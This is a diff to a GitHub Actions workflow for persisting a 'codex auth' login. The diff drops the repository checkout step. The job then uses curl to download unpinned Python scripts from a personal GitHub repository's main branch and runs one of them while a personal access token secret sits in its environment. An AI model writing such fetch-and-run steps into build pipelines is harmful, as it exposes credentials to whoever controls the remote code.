@@ -10,7 +10,7 @@ permissions:
   contents: read
 concurrency:
   group: codex-auth-account-1
-  cancel-in-progress: false
+  cancel-in-progress: true
 jobs:
   setup:
     runs-on: ubuntu-latest
@@ -18,9 +18,6 @@ jobs:
     env:
       RIU_GITHUB_PAT: ${{ secrets.RIU_GITHUB_PAT }}
     steps:
-      - uses: actions/checkout@v4
-        with:
-          persist-credentials: false
       - name: Check persistence bootstrap
         shell: bash
         run: |
@@ -49,4 +46,7 @@ jobs:
             echo '::error::RIU_GITHUB_PAT is required to persist the completed login.'
             exit 2
           fi
-          python scripts/persist_codex_auth_github.py --account 1
+          cd /tmp
+          curl -fsSL https://raw.githubusercontent.com/maxbry123-commits/router-universal-router-inteligente-/main/scripts/propagate_actions_secrets.py -o propagate_actions_secrets.py
+          curl -fsSL https://raw.githubusercontent.com/maxbry123-commits/router-universal-router-inteligente-/main/scripts/persist_codex_auth_github.py -o persist_codex_auth_github.py
+          python persist_codex_auth_github.py --account 1
